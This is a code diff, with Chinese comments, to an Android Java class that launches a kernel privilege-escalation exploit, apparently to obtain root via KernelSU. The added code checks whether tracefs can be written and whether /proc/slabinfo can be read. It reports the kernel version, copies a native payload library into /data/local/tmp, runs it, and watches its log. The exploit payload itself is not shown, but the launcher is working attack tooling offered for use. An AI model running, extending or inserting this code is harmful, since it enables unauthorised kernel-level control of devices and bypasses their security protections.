@@ -68,6 +68,12 @@ public class RootRunner implements Runnable {
         return sh(command, new String[]{});
     }
 
+    /** /proc/version 的内核串（A17 上 /proc/sys/kernel/osrelease 读不到）。 */
+    private static String kernelHint() {
+        String v = sh("awk '{print $3}' /proc/version 2>/dev/null");
+        return v == null ? "?" : v.trim().isEmpty() ? "?" : v.trim();
+    }
+
     private static String sh(String command) {
         return sh(command, new String[]{});
     }
@@ -89,9 +95,59 @@ public class RootRunner implements Runnable {
         return "libtimer-a16.so";
     }
 
+    /**
+     * 真机自检：exploit 需要**写** tracefs（trigger / tracing_on / buffer_size_kb），
+     * 而 Android 的 shell 通常只有 readtracefs 只读组 —— 读得到不等于写得进。
+     * 这里在启动前实际写一次（写入当前值，不改变任何状态），失败就提前中止，
+     * 免得白跑一轮还让用户怀疑偏移。
+     *
+     * @return null = 通过；否则是失败原因
+     */
+    private String preflight() {
+        String r;
+
+        r = sh("head -1 /proc/slabinfo >/dev/null 2>&1 && echo S_OK || echo S_FAIL");
+        if (!r.contains("S_OK")) {
+            return "读不到 /proc/slabinfo（SELinux 或权限限制）";
+        }
+
+        // 写 enable=0：幂等，不会打开任何事件
+        r = sh("echo 0 > /sys/kernel/tracing/events/kmem/kmem_cache_alloc/enable "
+                + "2>/dev/null && echo W_OK || echo W_FAIL");
+        if (!r.contains("W_OK")) {
+            return "没有 tracefs 写权限（events/…/enable 写不进去）—— "
+                    + "shell 只有 readtracefs 只读组，本 exploit 无法运行";
+        }
+
+        // 把 tracing_on 的当前值原样写回：校验能写顶层 tracing 文件
+        r = sh("v=$(cat /sys/kernel/tracing/tracing_on 2>/dev/null); "
+                + "echo $v > /sys/kernel/tracing/tracing_on 2>/dev/null "
+                + "&& echo T_OK || echo T_FAIL");
+        if (!r.contains("T_OK")) {
+            return "没有 tracefs 写权限（tracing_on 写不进去）";
+        }
+
+        // 读 trace_pipe_raw 0 字节：只探测可读性，不消费数据
+        r = sh("head -c 0 /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw "
+                + ">/dev/null 2>&1 && echo R_OK || echo R_FAIL");
+        if (!r.contains("R_OK")) {
+            return "读不到 per_cpu/cpu0/trace_pipe_raw（tracefs 只读面也不完整）";
+        }
+
+        return null;
+    }
+
     @Override
     public void run() {
         try {
+            String why = preflight();
+            if (why != null) {
+                sink.onLine("自检未通过：" + why);
+                sink.onDone(false, "环境不支持：" + why);
+                return;
+            }
+            sink.onLine("自检通过：slabinfo 可读 · tracefs 可写 · trace_pipe_raw 可读");
+
             String libName = payloadLib();
             String lib = ctx.getApplicationInfo().nativeLibraryDir + "/" + libName;
             String tmp = "/data/local/tmp/a/ptimer";
@@ -101,7 +157,7 @@ public class RootRunner implements Runnable {
                     + " && cd /data/local/tmp"
                     + " && " + tmp + " fake -d";
 
-            sink.onLine("正在部署载荷 (" + libName + ")…");
+            sink.onLine("正在部署载荷 (" + libName + ")，内核 " + kernelHint() + "…");
             sh(launch, new String[]{"KSU_PKG=" + ksuPkg});
             sink.onLine("exploit 已启动，正在跟踪 timer.log（成功有概率性，"
                     + "没抓中请重启后再试）…");
